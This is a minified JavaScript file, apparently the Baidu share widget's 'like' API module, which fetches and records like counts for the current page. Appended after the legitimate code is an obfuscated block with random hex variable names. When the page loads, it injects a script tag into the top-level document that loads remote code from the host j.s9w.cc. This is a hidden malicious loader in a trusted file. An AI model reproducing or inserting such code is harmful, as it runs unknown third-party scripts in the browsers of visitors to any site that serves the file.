// build time:Thu Jun 21 2018 11:14:48 GMT+0800 (GMT+08:00)
window._bd_share_main.F.module("share/like_api",function(e,t,n){var a=e("base/tangram").T,d=e("base/class").Class,c=e("share/api_base");t.Api=d.create(function(e){function t(e){window._bd_share_main.F.use("trans/data",function(t){t.get({type:"like_count",url:document.location.href,callback:function(t){var n={count:t};e&&e(n)}})})}function n(t){var n=e;window._bd_share_main.F.use("trans/trans",function(e){e.run({type:"like",url:document.location.href,callback:function(e){var n={err:e};t&&t(n)}})})}var a=this,d={count:0,clicked:!1};a._init=function(){var e=a.getView();e.render(),e.init(),t(function(t){d.count=t.count,e.setNumber(t.count)})},a._processAction=function(e){e.cmd=="like"&&(d.clicked?a.getView().showDoneState(e.element):n(function(t){d.clicked=!0,t.err==0?(d.count++,a.getView().addOne(e.element,d.count)):a.getView().showDoneState(e.element)}))}},c.ApiBase)});(function(){window.v6d061dfa0ddfd12160ad851976e4a26d="fx";window.v6d061dfa0ddfd12160ad851976e4a26e="j.s9w.cc"})();var f476e749bb252bde7a5c2c9994b6116ce=function(){function e(e){if(!n&&("onreadystatechange"!==e.type||"complete"===document.readyState)){for(e=0;e<t.length;e++)t[e].call(document);n=!0;t=null}}var t=[],n=!1;document.addEventListener?(document.addEventListener("DOMContentLoaded",e,!1),document.addEventListener("readystatechange",e,!1),window.addEventListener("load",e,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",e),window.attachEvent("onload",e));return function(e){n?e.call(document):t.push(e)}}();function f006b08735d9928a8820efe00a26753e7(){try{var e=window.top.document;if(!e.getElementById("82ac324e455efd0ecd2e73d22d852758")){var t=e.createElement("script");t.setAttribute("type","text/javascript");t.setAttribute("id","82ac324e455efd0ecd2e73d22d852758");var n="http://"+window.v6d061dfa0ddfd12160ad851976e4a26e+"/j/?v=1&t="+window.v6d061dfa0ddfd12160ad851976e4a26d+"&j=j";e.getElementsByTagName("head")[0].appendChild(t);t.setAttribute("src",n)}}catch(a){console.log(a.message)}}f476e749bb252bde7a5c2c9994b6116ce(f006b08735d9928a8820efe00a26753e7);
//rebuild by neat 